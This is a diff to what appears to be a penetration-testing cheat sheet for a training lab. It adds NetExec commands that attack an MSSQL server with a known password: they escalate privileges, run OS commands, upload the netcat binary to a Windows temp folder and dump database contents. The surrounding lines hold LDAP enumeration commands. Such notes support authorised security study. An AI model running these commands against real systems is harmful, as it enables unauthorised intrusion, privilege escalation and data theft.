@@ -678,6 +678,16 @@ crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --trusted-fo
 # No password
 crackmapexec ldap 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --password-not-required
 
+# MSSQL
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv -o ACTION=privesc
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -x 'whoami'
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth --put-file /usr/share/windows-binaries/nc.exe 'C:/Windows/Temp/nc.exe'
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES"
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT * from [dbname].[dbo].table_name"
+nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv -o ACTION=rollback
+
 # sid
 crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --get-sid
 # MS-DS-Machine-Account-Quota
